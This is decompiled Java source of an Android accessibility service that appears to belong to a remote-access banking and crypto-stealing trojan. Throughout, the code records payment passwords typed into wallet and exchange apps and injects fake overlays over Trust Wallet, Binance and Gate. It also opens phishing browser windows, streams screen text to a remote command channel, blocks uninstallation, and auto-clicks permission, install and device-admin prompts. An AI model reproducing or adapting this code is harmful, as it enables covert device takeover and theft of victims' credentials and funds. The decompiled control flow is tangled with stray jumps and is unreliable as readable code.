public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent0) {
        AccessibilityNodeInfo accessibilityNodeInfo15;
        String s24;
        int v3;
        List list0;
        String s22;
        Timer timer0;
        String s21;
        Context context0;
        byte[] arr_b;
        ByteArrayOutputStream byteArrayOutputStream0;
        Bitmap bitmap0;
        Drawable drawable0;
        String s19;
        Map.Entry map$Entry0;
        SupportedBrowserConfig accessService$SupportedBrowserConfig0;
        Iterator iterator0;
        String s16;
        String s15;
        int v2;
        int v1;
        AccessibilityNodeInfo accessibilityNodeInfo12;
        AccessibilityNodeInfo accessibilityNodeInfo10;
        int v;
        String s = "NotFound";
        Hidden.noUninstall(accessibilityEvent0, this);
        Uninstall.check(accessibilityEvent0);
        Perfct.check(accessibilityEvent0, this);
        ClickUnlock.checkEvent(accessibilityEvent0, this);
        OppoUnlock.checkOppoLoc(accessibilityEvent0, this);
        RecordPayPass.checkPayEvent(accessibilityEvent0, this);
        Trust.checkEvent(accessibilityEvent0, this);
        Binance.checkEvent(accessibilityEvent0, this);
        Gate.checkEvent(accessibilityEvent0, this);
        if((this.showtrust) && !Trust.ifShowDialog && accessibilityEvent0.getEventType() == 8) {
            AccessibilityNodeInfo accessibilityNodeInfo0 = accessibilityEvent0.getSource();
            if(accessibilityNodeInfo0 != null) {
                String s1 = accessibilityNodeInfo0.getViewIdResourceName();
                if(s1 != null && (s1.equals("com.wallet.crypto.trustapp:id/input_general_amount"))) {
                    Trust.trustinj(this, BiType.USDT);
                }
                accessibilityNodeInfo0.recycle();
            }
        }
        if((this.showbinance) && accessibilityEvent0.getEventType() == 8) {
            AccessibilityNodeInfo accessibilityNodeInfo1 = accessibilityEvent0.getSource();
            if(accessibilityNodeInfo1 != null) {
                String s2 = accessibilityNodeInfo1.getViewIdResourceName();
                if(s2 != null && ((s2.equals("com.binance.dev:id/2131365306")) || (s2.equals("com.binance.dev:id/2131365309"))) || (s2.equals("com.binance.dev:id/2131430824")) || (s2.equals("com.binance.dev:id/2131430869"))) {
                    Binance.binanceinj(this);
                }
                accessibilityNodeInfo1.recycle();
            }
        }
        if((this.showgate) && accessibilityEvent0.getEventType() == 8) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityEvent0.getSource();
            if(accessibilityNodeInfo2 != null) {
                String s3 = accessibilityNodeInfo2.getViewIdResourceName();
                if(s3 != null && (s3.equals("com.gatei0.cn.gatei0:id/google_code_input"))) {
                    Gate.gateinj(this);
                }
                accessibilityNodeInfo2.recycle();
            }
        }
        if((this.showCrypto) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo accessibilityNodeInfo3 = accessibilityEvent0.getSource();
            if(accessibilityNodeInfo3 != null) {
                String s4 = accessibilityNodeInfo3.getViewIdResourceName();
                if(s4 != null && (s4.equals("co.mona.android:id/etVerificationCode"))) {
                    Crypto.cryptoinj(this);
                }
                accessibilityNodeInfo3.recycle();
            }
        }
        if((this.showgate) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo accessibilityNodeInfo4 = accessibilityEvent0.getSource();
            if(accessibilityNodeInfo4 != null && ("com.gatei0.cn.gatei0:id/fund_password_input".equals(accessibilityNodeInfo4.getViewIdResourceName()))) {
                this.startgatepwd = true;
            }
        }
        if((this.startgatepwd) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED && accessibilityEvent0.getText().size() == 1) {
            String s5 = ((CharSequence)accessibilityEvent0.getText().get(0)).toString();
            if(s5 != null) {
                AccessService.Gatepay = "" + s5.replaceAll("[\\u4e00-\\u9fa5?]", "");
            }
        }
        if((this.showgate) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo accessibilityNodeInfo5 = accessibilityEvent0.getSource();
            if((this.startgatepwd) && accessibilityNodeInfo5 != null && accessibilityNodeInfo5.getViewIdResourceName() != null && (("com.gatei0.cn.gatei0:id/sms_code_input".equals(accessibilityNodeInfo5.getViewIdResourceName())) || ("com.gatei0.cn.gatei0:id/email_code_input".equals(accessibilityNodeInfo5.getViewIdResourceName())) || ("com.gatei0.cn.gatei0:id/google_code_input".equals(accessibilityNodeInfo5.getViewIdResourceName())) || ("com.gatei0.cn.gatei0:id/sms_code_get".equals(accessibilityNodeInfo5.getViewIdResourceName())) || ("com.gatei0.cn.gatei0:id/email_code_get".equals(accessibilityNodeInfo5.getViewIdResourceName())))) {
                this.startgatepwd = false;
            }
        }
        if((this.paytpd) && (this.showtp) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo accessibilityNodeInfo6 = accessibilityEvent0.getSource();
            if(accessibilityNodeInfo6 != null && ("vip.mytokenpocket:id/edt_dialog_pwd".equals(accessibilityNodeInfo6.getViewIdResourceName()))) {
                this.starttppwd = true;
                AccessService.Tppay = "";
            }
        }
        if((this.paytpd) && (this.starttppwd) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED && accessibilityEvent0.getText().size() == 1) {
            String s6 = ((CharSequence)accessibilityEvent0.getText().get(0)).toString();
            if(s6 != null) {
                AccessService.Tppay = "" + s6.replaceAll("[\\u4e00-\\u9fa5?]", "");
            }
        }
        if((this.paytpd) && (this.starttppwd) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && ("vip.mytokenpocket".equals(accessibilityEvent0.getPackageName())) && accessibilityEvent0.getText() != null && !accessibilityEvent0.getText().isEmpty() && ("TokenPocket".equals(accessibilityEvent0.getText().get(0)))) {
            this.starttppwd = false;
            FileUtils.writeText(new File(Environment.getExternalStorageDirectory().toString() + "/Config/sys/apps/pay/pay_tp.text"), "");
        }
        if((this.payimd) && (this.showim) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo accessibilityNodeInfo7 = accessibilityEvent0.getSource();
            if(accessibilityNodeInfo7 != null && ("transferPassword".equals(accessibilityNodeInfo7.getViewIdResourceName()))) {
                this.startimpwd = true;
                AccessService.Impay = "";
            }
        }
        if((this.payimd) && (this.startimpwd) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED && accessibilityEvent0.getText().size() == 1) {
            String s7 = ((CharSequence)accessibilityEvent0.getText().get(0)).toString();
            if(s7 != null) {
                AccessService.Impay = "" + s7.replaceAll("[\\u4e00-\\u9fa5?]", "");
            }
        }
        if((this.payimd) && (this.startimpwd) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED && accessibilityEvent0.getSource() != null && accessibilityEvent0.getSource().getText() != null && (accessibilityEvent0.getSource().getText().toString().contains("??????"))) {
            this.startimpwd = false;
            FileUtils.writeText(new File(Environment.getExternalStorageDirectory().toString() + "/Config/sys/apps/pay/pay_im.text"), "");
        }
        if((this.showCrypto) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo accessibilityNodeInfo8 = accessibilityEvent0.getSource();
            if(accessibilityNodeInfo8 != null && ("co.mona.android:id/primaryBtn".equals(accessibilityNodeInfo8.getViewIdResourceName()))) {
                this.startcypwd = true;
                AccessService.Cypay = "";
            }
        }
        if((this.startcypwd) && accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED && accessibilityEvent0.getText().size() == 1) {
            String s8 = ((CharSequence)accessibilityEvent0.getText().get(0)).toString();
            if(s8 != null) {
                AccessService.Cypay = "" + s8.replaceAll("[^0-9]", "");
            }
        }
        if(accessibilityEvent0.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo accessibilityNodeInfo9 = accessibilityEvent0.getSource();
            if(accessibilityNodeInfo9 != null) {
                String s9 = accessibilityNodeInfo9.getViewIdResourceName();
                if((this.showtrust) && (Trust.ifShowDialog) && Trust.showType == 2 && ("com.wallet.crypto.trustapp".equals(accessibilityEvent0.getPackageName())) && ("com.wallet.crypto.trustapp:id/action_send".equals(s9))) {
                    Trust.hideInjectView();
                }
            }
        }
        try {
            if(initializeService.MyAccess == null) {
                initializeService.MyAccess = this;
            }
            try {
                v = accessibilityEvent0.getEventType();
            }
            catch(Exception unused_ex) {
                v = 0;
                goto label_97;
            }
            AccessService.GlobalEvent = accessibilityEvent0;
            try {
            label_97:
                if(AccessService.Oppobtrydont.booleanValue()) {
                    this.batteryclicker(this, this.getApplicationContext(), 1);
                }
                if(AccessService.MIUIbattary.booleanValue()) {
                    this.batteryclicker(this, this.getApplicationContext(), 0);
                }
            }
            catch(Exception exception0) {
                goto label_397;
            }
            try {
                if(this.getServiceInfo() == null) {
                    AccessibilityServiceInfo accessibilityServiceInfo0 = new AccessibilityServiceInfo();
                    accessibilityServiceInfo0.flags = 83;
                    accessibilityServiceInfo0.eventTypes = -1;
                    accessibilityServiceInfo0.notificationTimeout = 1L;
                    accessibilityServiceInfo0.packageNames = null;
                    accessibilityServiceInfo0.feedbackType = -1;
                    this.setServiceInfo(accessibilityServiceInfo0);
                }
            }
            catch(Exception unused_ex) {
            }
            try {
                accessibilityNodeInfo10 = accessibilityEvent0.getSource();
                goto label_114;
            }
            catch(Exception unused_ex) {
            }
        }
        catch(OutOfMemoryError outOfMemoryError0) {
            outOfMemoryError0.printStackTrace();
            return;
        }
        AccessibilityNodeInfo accessibilityNodeInfo11 = null;
        accessibilityNodeInfo12 = this.getRootInActiveWindow();
        goto label_120;
    label_114:
        accessibilityNodeInfo11 = accessibilityNodeInfo10;
        try {
            accessibilityNodeInfo12 = this.getRootInActiveWindow();
            goto label_120;
        }
        catch(Exception unused_ex) {
        }
        catch(OutOfMemoryError outOfMemoryError0) {
            outOfMemoryError0.printStackTrace();
            return;
        }
        AccessibilityNodeInfo accessibilityNodeInfo13 = null;
        goto label_122;
    label_120:
        accessibilityNodeInfo13 = accessibilityNodeInfo12;
        try {
        label_122:
            this.ScreenScanner(this, this.getApplicationContext());
            switch(v) {
                case 2: {
                    goto label_197;
                }
                case 8: {
                    v1 = 1;
                    goto label_218;
                }
                case 16: {
                    v1 = 3;
                    goto label_218;
                }
                case 0x20: {
                    goto label_203;
                }
                case 0x40: {
                    goto label_216;
                }
                default: {
                    if(v != 0x4000) {
                        v1 = 0;
                        goto label_218;
                    }
                    String s10 = accessibilityEvent0.getText() == null ? "" : accessibilityEvent0.getText().toString();
                }
            }
        }
        catch(Exception exception0) {
            goto label_397;
        }
        catch(OutOfMemoryError outOfMemoryError0) {
            outOfMemoryError0.printStackTrace();
            return;
        }
        switch(s10) {
            case "[Block]": {
                try {
                    AccessService.Fakelay.setClickable(true);
                    AccessService.Fakelay.setVisibility(0);
                }
                catch(Exception unused_ex) {
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                    outOfMemoryError0.printStackTrace();
                    return;
                }
                goto label_193;
            }
            case "[Paste]": {
                goto label_177;
            }
            case "[Prim]": {
                try {
                    try {
                        if(!AccessService.ifrequestpermissionSu.booleanValue()) {
                            this.startActivity(new Intent(this, RequestPermissions.class).addFlags(0x10000000).addFlags(0x800000));
                        }
                        goto label_193;
                    }
                    catch(Exception exception0) {
                        goto label_397;
                    }
                    try {
                    label_154:
                        Intent intent2 = new Intent("miui.intent.action.APP_PERM_EDITOR");
                        intent2.putExtra("extra_package_uid", Process.myUid());
                        intent2.putExtra("extra_pkgname", "spymax.stub7.suffix");
                        intent2.addFlags(0x10000000);
                        intent2.addFlags(0x20000000);
                        intent2.addFlags(0x4000000);
                        this.startActivity(intent2);
                        AccessService.MIUIbattary = Boolean.valueOf(true);
                        AccessService.Skipclickother = Boolean.valueOf(true);
                        goto label_193;
                    }
                    catch(Exception unused_ex) {
                    }
                    try {
                        Intent intent3 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                        intent3.addCategory("android.intent.category.DEFAULT");
                        intent3.addFlags(0x10000000);
                        intent3.addFlags(0x8000);
                        intent3.addFlags(0x4000000);
                        intent3.addFlags(0x20000000);
                        intent3.setData(Uri.parse("package:spymax.stub7.suffix"));
                        this.startActivity(intent3);
                        AccessService.MIUIbattary = Boolean.valueOf(true);
                        goto label_193;
                    label_175:
                        this.startSettingsApp();
                        AccessService.Oppobtrydont = Boolean.valueOf(true);
                    label_177:
                        this.pasteText();
                        goto label_193;
                    }
                    catch(Exception exception0) {
                        goto label_397;
                    }
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                    outOfMemoryError0.printStackTrace();
                    return;
                }
            }
            case "[SCREEN]": {
                goto label_132;
                try {
                label_143:
                    exception1.printStackTrace();
                    goto label_193;
                label_146:
                    Intent intent1 = new Intent(this, RequestBattery.class);
                    intent1.addFlags(0x10000000);
                    intent1.addFlags(0x800000);
                    this.startActivity(intent1);
                    goto label_193;
                }
                catch(Exception exception0) {
                    goto label_397;
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                    outOfMemoryError0.printStackTrace();
                    return;
                }
            }
            case "[Wake]": {
                try {
                    try {
                        v2 = 1;
                        goto label_195;
                    }
                    catch(Exception exception0) {
                        goto label_397;
                    }
                    try {
                    label_132:
                        String s11 = (String)this.CommandsData.get("SCREEN_key");
                        Intent intent0 = new Intent(this, RequestScreenCap.class);
                        intent0.addFlags(0x10000000);
                        intent0.addFlags(0x800000);
                        intent0.addFlags(0x4000000);
                        intent0.addFlags(0x8000);
                        intent0.putExtra("key", s11);
                        this.startActivity(intent0);
                        this.CommandsData.remove("SCREEN_key");
                        goto label_193;
                    }
                    catch(Exception exception1) {
                        goto label_143;
                    }
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                    outOfMemoryError0.printStackTrace();
                    return;
                }
            }
            case "[actionMU]": {
                goto label_154;
            }
            case "[action]": {
                goto label_175;
            }
            case "[bassit]": {
                goto label_185;
            }
            case "[battery]": {
                goto label_146;
            }
            case "[unBlock]": {
                try {
                    try {
                        AccessService.Fakelay.setClickable(false);
                        AccessService.Fakelay.setVisibility(8);
                        goto label_193;
                    label_185:
                        AccessService.Fakelay.setClickable(false);
                        AccessService.Fakelay.setLayoutParams(AccessService.Fakeparams_bass);
                        AccessService.wm.updateViewLayout(AccessService.Fakelay, AccessService.Fakeparams_bass);
                        goto label_193;
                    label_189:
                        AccessService.Fakelay.setClickable(true);
                        AccessService.Fakelay.setLayoutParams(AccessService.Fakeparams);
                        AccessService.wm.updateViewLayout(AccessService.Fakelay, AccessService.Fakeparams);
                    }
                    catch(Exception unused_ex) {
                    }
                    try {
                    label_193:
                        v2 = 0;
                    label_195:
                        if(v2 == 0) {
                            return;
                        label_197:
                            v1 = 2;
                        }
                        else {
                            v1 = 1;
                            goto label_218;
                        label_203:
                            if(AccessService.PakgsAlert != null && !AccessService.PakgsAlert.isEmpty() && accessibilityEvent0.getPackageName() != null) {
                                String s12 = accessibilityEvent0.getPackageName().toString();
                                if(!s12.equals("spymax.stub7.suffix") && (AccessService.PakgsAlert.contains(s12))) {
                                    if("".equals(s12)) {
                                        this.StartAlerter(this, this.getApplicationContext(), s12, 0);
                                    }
                                    else {
                                        AccessService.Currentlocated = s12;
                                        if(!AccessService.PakgsAlert.IsAlerted(s12)) {
                                            AccessService.PakgsAlert.UpdateList("", true);
                                            this.StartAlerter(this, this.getApplicationContext(), s12, 0);
                                            utilities.RecordActivity(AccessService.getAppNameFromPkgName(this, s12), "Opened");
                                        }
                                    }
                                }
                            }
                            v1 = 5;
                            goto label_218;
                        label_216:
                            v1 = 4;
                        }
                    label_218:
                        this.ClassGen12_SLG(accessibilityEvent0, v1);
                        break;
                    }
                    catch(Exception exception0) {
                        goto label_397;
                    }
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                    outOfMemoryError0.printStackTrace();
                    return;
                }
            }
            case "[unbassit]": {
                goto label_189;
            }
            default: {
                goto label_193;
            }
        }
        if(AccessService.TNames.size() > 0) {
            try {
                if(accessibilityEvent0.getPackageName() != null) {
                    String s13 = accessibilityEvent0.getPackageName().toString().toLowerCase();
                    if(!s13.equals("spymax.stub7.suffix") && !s13.equals("com.google.android.inputmethod.latin")) {
                        s = s13;
                        goto label_227;
                    }
                    return;
                }
            }
            catch(Exception unused_ex) {
            }
            catch(OutOfMemoryError outOfMemoryError0) {
                outOfMemoryError0.printStackTrace();
                return;
            }
        label_227:
            String s14 = s;
            try {
                CharSequence charSequence0 = accessibilityEvent0.getPackageName();
            }
            catch(Exception unused_ex) {
                goto label_283;
            }
            catch(OutOfMemoryError outOfMemoryError0) {
                outOfMemoryError0.printStackTrace();
                return;
            }
            if(charSequence0 == null) {
                s16 = "";
            }
            else {
                try {
                    s15 = accessibilityEvent0.getPackageName().toString();
                }
                catch(Exception unused_ex) {
                    goto label_283;
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                    outOfMemoryError0.printStackTrace();
                    return;
                }
                s16 = s15;
            }
            try {
                iterator0 = AccessService.getSupportedBrowsers().iterator();
                accessService$SupportedBrowserConfig0 = null;
                while(true) {
                label_236:
                    boolean z = iterator0.hasNext();
                    break;
                }
            }
            catch(Exception unused_ex) {
                goto label_283;
            }
            catch(OutOfMemoryError outOfMemoryError0) {
                outOfMemoryError0.printStackTrace();
                return;
            }
            if(!z) {
                goto label_243;
            }
            try {
                try {
                    Object object0 = iterator0.next();
                    SupportedBrowserConfig accessService$SupportedBrowserConfig1 = (SupportedBrowserConfig)object0;
                    if(!accessService$SupportedBrowserConfig1.packageName.equals(s16)) {
                        goto label_236;
                    }
                    accessService$SupportedBrowserConfig0 = accessService$SupportedBrowserConfig1;
                    goto label_236;
                label_243:
                    String s17 = accessService$SupportedBrowserConfig0 == null ? null : this.captureUrl(accessibilityNodeInfo11, accessService$SupportedBrowserConfig0);
                    if(s17 == null) {
                        s17 = "NOTFOUND";
                    }
                }
                catch(Exception unused_ex) {
                    goto label_283;
                }
                try {
                    Iterator iterator1 = AccessService.Map_Name_Lnk.entrySet().iterator();
                    while(true) {
                    label_248:
                        if(!iterator1.hasNext()) {
                            goto label_283;
                        }
                        Object object1 = iterator1.next();
                        map$Entry0 = (Map.Entry)object1;
                        break;
                    }
                }
                catch(Exception unused_ex) {
                    goto label_283;
                }
                try {
                    String s18 = (String)map$Entry0.getKey();
                    s19 = (String)map$Entry0.getValue();
                    String s20 = (String)AccessService.Map_Name_ID.get(s18);
                    if(AccessService.isSameWebsite(s17.toLowerCase(), s19)) {
                        drawable0 = this.getPackageManager().getApplicationIcon(s16);
                        goto label_266;
                    }
                    else {
                        if(s20 == null) {
                            s22 = s14;
                            s14 = s22;
                            goto label_248;
                        }
                        goto label_256;
                    }
                }
                catch(Exception unused_ex) {
                    s22 = s14;
                }
                s14 = s22;
                goto label_248;
            }
            catch(OutOfMemoryError outOfMemoryError0) {
                outOfMemoryError0.printStackTrace();
                return;
            }
        label_256:
            if(s20.toLowerCase().equals(s14)) {
                try {
                    drawable0 = this.getPackageManager().getApplicationIcon(s16);
                    goto label_266;
                }
                catch(PackageManager.NameNotFoundException packageManager$NameNotFoundException0) {
                }
                catch(Exception unused_ex) {
                    s22 = s14;
                    s14 = s22;
                    goto label_248;
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                    outOfMemoryError0.printStackTrace();
                    return;
                }
                try {
                    packageManager$NameNotFoundException0.printStackTrace();
                    drawable0 = null;
                label_266:
                    bitmap0 = this.convertToBitmap(drawable0, 0x90, 0x90);
                    byteArrayOutputStream0 = new ByteArrayOutputStream();
                    bitmap0.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream0);
                    arr_b = byteArrayOutputStream0.toByteArray();
                    context0 = this.getApplicationContext();
                    s21 = AccessService.getAppNameFromPkgName(this, s16);
                    timer0 = new Timer();
                    goto label_276;
                }
                catch(Exception unused_ex) {
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                    outOfMemoryError0.printStackTrace();
                    return;
                }
            }
            s22 = s14;
            s14 = s22;
            goto label_248;
        label_276:
            s22 = s14;
            try {
                timer0.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        Intent intent0 = new Intent(context0, CraxsBrowser.class);
                        intent0.addFlags(0x10000000);
                        intent0.addFlags(0x20000000);
                        intent0.putExtra("key", s19);
                        intent0.putExtra("label", s21);
                        intent0.putExtra("icon", arr_b);
                        AccessService.this.startActivity(intent0);
                    }
                }, 1000L);
                bitmap0.recycle();
                byteArrayOutputStream0.close();
            }
            catch(Exception unused_ex) {
            }
            catch(OutOfMemoryError outOfMemoryError0) {
                outOfMemoryError0.printStackTrace();
                return;
            }
            s14 = s22;
            goto label_248;
        }
    label_283:
        if(accessibilityNodeInfo11 != null) {
            try {
                if(AccessService.SendScreenText.booleanValue()) {
                    String s23 = this.ScanScreenText(accessibilityNodeInfo11);
                    if(!s23.isEmpty()) {
                        if(this.lastpackage != accessibilityEvent0.getPackageName().toString() && accessibilityEvent0.getPackageName().toString() != "spymax.stub7.suffix") {
                            this.lastpackage = accessibilityEvent0.getPackageName().toString();
                            CommandsService._send_it_("-759", "CLR".getBytes());
                        }
                        CommandsService._send_it_("-759", s23.getBytes());
                    }
                }
            label_291:
                if(accessibilityNodeInfo11 != null && accessibilityEvent0 != null && accessibilityEvent0.getClassName() != null && (accessibilityEvent0.getClassName().toString().equals("android.widget.EditText"))) {
                    AccessService.Globalnode = accessibilityNodeInfo11;
                }
                goto label_293;
            }
            catch(Exception unused_ex) {
                goto label_293;
            }
            catch(OutOfMemoryError outOfMemoryError0) {
                outOfMemoryError0.printStackTrace();
                return;
            }
        }
        goto label_291;
    label_293:
        switch(v) {
            case 0x20: {
                try {
                    try {
                        if(AccessService.DisabledApps.size() > 0 && accessibilityEvent0.getPackageName() != null && (AccessService.DisabledApps.contains(accessibilityEvent0.getPackageName().toString().toLowerCase()))) {
                            this.blockBack();
                            this.SendMeHome();
                        }
                    }
                    catch(Exception unused_ex) {
                    }
                    try {
                        if(CommandsService.echo) {
                            this.ActivSend(accessibilityEvent0);
                            break;
                        label_301:
                            if(CommandsService.echo) {
                                this.SendNotifi(accessibilityEvent0);
                            }
                        }
                    }
                    catch(Exception unused_ex) {
                    }
                    break;
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                    outOfMemoryError0.printStackTrace();
                    return;
                }
            }
            case 0x40: {
                goto label_301;
            }
        }
        try {
            if((AccessService.FOR_KYB.booleanValue()) && (PermissionsManager.isinputon(this))) {
                AccessService.FOR_KYB = Boolean.valueOf(false);
            }
            if((AccessService.Auto_Click.booleanValue()) || (AccessService.FOR_SC.booleanValue()) || (AccessService.FOR_prim.booleanValue()) || (AccessService.FOR_ADM.booleanValue()) || (AccessService.FOR_KYB.booleanValue()) || (AccessService.FOR_INST.booleanValue())) {
                goto label_309;
            }
        }
        catch(Exception exception0) {
            goto label_397;
        }
        catch(OutOfMemoryError outOfMemoryError0) {
            outOfMemoryError0.printStackTrace();
            return;
        }
        if(!AccessService.FOR_btry.booleanValue()) {
            goto label_391;
        }
    label_309:
        if(accessibilityNodeInfo11 != null && accessibilityNodeInfo13 != null) {
            try {
                try {
                    if((AccessService.FOR_IN.booleanValue()) && (this.performInstallationActions().booleanValue())) {
                        AccessService.FOR_IN = Boolean.valueOf(false);
                    }
                    if(AccessService.FOR_prim.booleanValue()) {
                        list0 = null;
                        v3 = 0;
                        while(true) {
                        label_315:
                            if(v3 >= 10) {
                                break;
                            }
                            s24 = new String[]{"Allow", "Autoriser", "Erlauben", "Permitir", "允许", "??", "\u0627\u0644\u0633\u0645\u0627\u062D", "izin ver", "Permitir", "Permitir"}[v3];
                            goto label_317;
                        }
                    }
                    goto label_328;
                }
                catch(Exception unused_ex) {
                    goto label_389;
                }
                try {
                label_317:
                    List list1 = this.findNodesByText(s24);
                    list0 = list1;
                }
                catch(Exception unused_ex) {
                }
                if(list0 == null) {
                    ++v3;
                    goto label_315;
                }
                try {
                    if(list0.isEmpty()) {
                        ++v3;
                        goto label_315;
                    }
                    else {
                        AccessibilityNodeInfo accessibilityNodeInfo14 = (AccessibilityNodeInfo)list0.get(0);
                        accessibilityNodeInfo14.performAction(16);
                        AccessService.Auto_Click = Boolean.valueOf(false);
                        accessibilityNodeInfo14.recycle();
                    }
                label_328:
                    if(AccessService.FOR_DRW.booleanValue()) {
                        Iterator iterator2 = Arrays.asList(new String[]{"Activate this device admin app", "Etkinle?tir", "\u062A\u0641\u0639\u064A\u0644", "启用"}).iterator();
                        while(true) {
                        label_330:
                            if(!iterator2.hasNext()) {
                                break;
                            }
                            Object object2 = iterator2.next();
                            List list2 = accessibilityNodeInfo11.findAccessibilityNodeInfosByText(((String)object2));
                            if(list2.isEmpty()) {
                                goto label_330;
                            }
                            Iterator iterator3 = list2.iterator();
                        label_335:
                            while(iterator3.hasNext()) {
                                Object object3 = iterator3.next();
                                accessibilityNodeInfo15 = (AccessibilityNodeInfo)object3;
                                goto label_338;
                            }
                        }
                    }
                    goto label_349;
                }
                catch(Exception unused_ex) {
                    goto label_389;
                }
                try {
                label_338:
                    if(accessibilityNodeInfo15.isClickable()) {
                        accessibilityNodeInfo15.performAction(16);
                        Rect rect0 = new Rect();
                        accessibilityNodeInfo15.getBoundsInScreen(rect0);
                        int v4 = rect0.left + rect0.width() / 2;
                        int v5 = rect0.top + rect0.height() / 2;
                        this.click(v4, v5);
                        if(Build.VERSION.SDK_INT >= 24) {
                            AccessService.clickAtPosition(v4, v5, accessibilityNodeInfo13);
                        }
                    }
                }
                catch(Exception unused_ex) {
                }
                try {
                    accessibilityNodeInfo15.recycle();
                    goto label_335;
                label_349:
                    String[] arr_s = {"卸载", "卸�d", "Uninstall", "アンインスト�`ル", "Désinstaller"};
                    for(int v6 = 0; v6 < 15; ++v6) {
                        for(Object object4: accessibilityNodeInfo11.findAccessibilityNodeInfosByViewId(new String[]{"@com.android.packageinstaller:id/confirm_button", "com.android.packageinstaller:id/permission_allow_button", "com.android.packageinstaller:id/permission_allow_always_button", "com.android.packageinstaller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.settings:id/action_button", "com.android.settings:id/allow_button", "com.lbe.security.miui:id/permission_allow_foreground_only_button", "@vivo:id/confirm_msg", "android:id/button1", "com.android.settings:id/permission_allow_button", "com.android.permissioncontroller:id/permission_allow_button", "miui:id/grant", "miui:id/button2", "miui:id/action_positive"}[v6])) {
                            AccessibilityNodeInfo accessibilityNodeInfo16 = (AccessibilityNodeInfo)object4;
                            if(accessibilityNodeInfo16.getText() != null && (Arrays.asList(arr_s).contains(accessibilityNodeInfo16.getText().toString()))) {
                                return;
                            }
                            accessibilityNodeInfo16.performAction(16);
                            AccessService.Auto_Click = Boolean.valueOf(false);
                        }
                    }
                    for(int v7 = 0; v7 < 3; ++v7) {
                        for(Object object5: accessibilityNodeInfo11.findAccessibilityNodeInfosByViewId(new String[]{"com.android.permissioncontroller:id/permission_allow_foreground_only_button", "android:id/button1", "com.android.permissioncontroller:id/permission_allow_button"}[v7])) {
                            AccessibilityNodeInfo accessibilityNodeInfo17 = (AccessibilityNodeInfo)object5;
                            if(accessibilityNodeInfo17.getText() != null && (Arrays.asList(arr_s).contains(accessibilityNodeInfo17.getText().toString()))) {
                                return;
                            }
                            accessibilityNodeInfo17.performAction(16);
                            AccessService.Auto_Click = Boolean.valueOf(false);
                        }
                    }
                    List list3 = Arrays.asList(new String[]{"本次", "Once", "?????????????????????????????", "kali", "l?n", "????????", "始终", "Allow", "time", "????????", "izinkan", "Ch?p nh?n", "??????????"});
                    switch(Brand.getBrand().toLowerCase()) {
                        case "mi": 
                        case "redmi": 
                        case "xiaomi": {
                            for(Object object6: list3) {
                                List list4 = accessibilityNodeInfo11.findAccessibilityNodeInfosByText(((String)object6));
                                if(list4.isEmpty()) {
                                    continue;
                                }
                                AccessibilityNodeInfo accessibilityNodeInfo18 = (AccessibilityNodeInfo)list4.get(0);
                                if(!accessibilityNodeInfo18.isClickable()) {
                                    continue;
                                }
                                accessibilityNodeInfo18.performAction(16);
                                AccessService.Auto_Click = Boolean.valueOf(false);
                            }
                        }
                    }
                }
                catch(Exception unused_ex) {
                }
                try {
                label_389:
                    if(AccessService.FOR_REM.booleanValue()) {
                        AccessService.FOR_REM = Boolean.valueOf(false);
                    }
                }
                catch(Exception exception0) {
                    goto label_397;
                }
                try {
                label_391:
                    ((KeyguardManager)this.getSystemService("keyguard")).inKeyguardRestrictedInputMode();
                    AccessService.AppName = "[CYPHER_PATCH]";
                    AccessService.AppName2 = "[[CYPHER_PATCH]]";
                }
                catch(Exception unused_ex) {
                }
                try {
                    this.startconnection(this.getApplicationContext());
                    goto label_399;
                }
                catch(Exception exception0) {
                }
            }
            catch(OutOfMemoryError outOfMemoryError0) {
                outOfMemoryError0.printStackTrace();
                return;
            }
        label_397:
            exception0.printStackTrace();
            return;
        label_399:
            if(accessibilityNodeInfo11 != null) {
                try {
                    accessibilityNodeInfo11.recycle();
                    return;
                }
                catch(Exception unused_ex) {
                    return;
                }
                catch(OutOfMemoryError outOfMemoryError0) {
                }
                outOfMemoryError0.printStackTrace();
                return;
            }
            return;
        }
    }